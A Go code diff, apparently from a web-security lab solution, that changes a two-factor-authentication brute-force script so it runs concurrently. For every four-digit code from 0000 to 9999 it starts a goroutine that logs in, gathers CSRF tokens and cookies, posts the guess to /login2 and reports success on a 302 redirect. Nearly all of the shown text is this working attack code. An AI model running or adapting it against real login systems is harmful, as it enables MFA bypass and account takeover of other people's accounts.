@@ -19,15 +19,26 @@ func solve(hostname string) {
 	    - POST /login2 -- use csrf token from previous step, if 302 notify success, otherwise do not notify
 	*/
 
+	foundChannel := make(chan bool)
+
 	for mfaCode := 0; mfaCode < 10000; mfaCode++ {
-		csrfToken, cookies := firstStep(hostname)
-		log.Printf("CSRF Token from first step: %s", csrfToken)
-		cookies = secondStep(hostname, csrfToken, cookies)
-		log.Printf("Cookies from second step: %s", cookies)
-		csrfToken = thirdStep(hostname, cookies)
-		log.Printf("CSRF Token from third step: %s", csrfToken)
 		mfaCodeAsString := fmt.Sprintf("%04d", mfaCode)
-		fourthStep(hostname, cookies, csrfToken, mfaCodeAsString)
+		go attemptFlow(hostname, mfaCodeAsString, foundChannel)
+	}
+
+	<- foundChannel
+}
+
+func attemptFlow(hostname string, mfaCode string, foundChannel chan bool) {
+	csrfToken, cookies := firstStep(hostname)
+	log.Printf("CSRF Token from first step: %s", csrfToken)
+	cookies = secondStep(hostname, csrfToken, cookies)
+	log.Printf("Cookies from second step: %s", cookies)
+	csrfToken = thirdStep(hostname, cookies)
+	log.Printf("CSRF Token from third step: %s", csrfToken)
+	isSuccessful := fourthStep(hostname, cookies, csrfToken, mfaCode)
+	if isSuccessful {
+		foundChannel <- true
 	}
 }
 
@@ -112,7 +123,7 @@ func thirdStep(hostname string, cookies []*http.Cookie) string {
 	return findCsrfTokenInBody(string(responseBody))
 }
 
-func fourthStep(hostname string, cookies []*http.Cookie, csrfToken string, mfaCode string) {
+func fourthStep(hostname string, cookies []*http.Cookie, csrfToken string, mfaCode string) bool {
 	// POST /login2 -- use csrf token from previous step, if 302 notify success, otherwise do not notify
 	uri := fmt.Sprintf("%s/login2", hostname)
 	data := url.Values{"csrf": {csrfToken}, "mfa-code": {mfaCode}}
@@ -120,7 +131,7 @@ func fourthStep(hostname string, cookies []*http.Cookie, csrfToken string, mfaCo
 	req, err := http.NewRequest(http.MethodPost, uri, strings.NewReader(data.Encode()))
 	if err != nil {
 		log.Printf("Something not right when making the request from the fourth step...")
-		return
+		return false
 	}
 
 	for _, cookie := range cookies {
@@ -136,13 +147,16 @@ func fourthStep(hostname string, cookies []*http.Cookie, csrfToken string, mfaCo
 	resp, err := client.Do(req)
 	if err != nil {
 		log.Printf("Something not right when doing the request from the fourth step...")
+		return false
 	}
 
 	if resp.StatusCode == http.StatusFound {
 		log.Printf("Use this csrfToken: %s - mfaCode: %s - cookies: %s", csrfToken, mfaCode, cookies)
-	} else {
-		log.Printf("Not today :sad: - StatusCode: %s", resp.Status)
+		return true
 	}
+
+	log.Printf("Not today :sad: - StatusCode: %s", resp.Status)
+	return false
 }
 
 func findCsrfTokenInBody(body string) string {
